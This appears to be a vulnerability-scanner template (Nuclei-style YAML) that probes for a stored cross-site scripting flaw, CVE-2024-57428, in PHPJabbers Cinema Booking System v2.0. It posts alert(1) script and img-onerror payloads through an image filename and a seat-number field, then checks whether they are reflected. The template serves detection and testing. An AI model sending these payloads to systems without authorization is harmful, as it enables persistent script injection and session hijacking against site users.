id: cinema-booking-stored-xss

info:
  name: PHPJabbers Cinema Booking System v2.0 - Stored Cross-Site Scripting (XSS)
  author: ahrixia
  severity: high
  description: |
    A stored XSS vulnerability exists in PHPJabbers Cinema Booking System v2.0 due to unsanitized input in file upload fields (`event_img`, `seat_maps`) and seat number configurations (`number[new_X]`).
    Attackers can inject persistent JavaScript, leading to phishing, malware injection, and session hijacking.
  reference:
    - https://www.cve.org/CVERecord?id=CVE-2024-57428
    - https://www.phpjabbers.com/cinema-booking-system/
    - https://github.com/ahrixia/CVE-2024-57428
  classification:
    cve-id: CVE-2024-57428
    cwe-id: CWE-79
  metadata:
    vendor: phpjabbers
    product: cinema-booking-system
    affected-version: "2.0"
    verified: true
  tags: xss,stored-xss,cinema-booking

variables:
  subdir: 
    - "{{BaseURL}}"
    - "{{BaseURL}}/CinemaBooking"
    - "{{BaseURL}}/CinemaBookingDev"
    - "{{BaseURL}}/booking"
    - "{{BaseURL}}/cinema"
    - "{{BaseURL}}/cinemacms"

requests:
  - method: POST
    path:
      - "{{subdir}}/index.php?controller=pjAdminEvents&action=pjActionCreate"

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXSSPayload

    body: |
      ------WebKitFormBoundaryXSSPayload
      Content-Disposition: form-data; name="event_img"; filename="luffy.jpg\"><img src=a onerror=alert(1)>"
      Content-Type: image/jpeg

      ------WebKitFormBoundaryXSSPayload
      Content-Disposition: form-data; name="number[new_1]"

      1\"><script>alert(1)</script>1
      ------WebKitFormBoundaryXSSPayload--

    matchers:
      - type: word
        words:
          - "\"><img src=a onerror=alert(1)>"
          - "\"><script>alert(1)</script>"
        condition: or
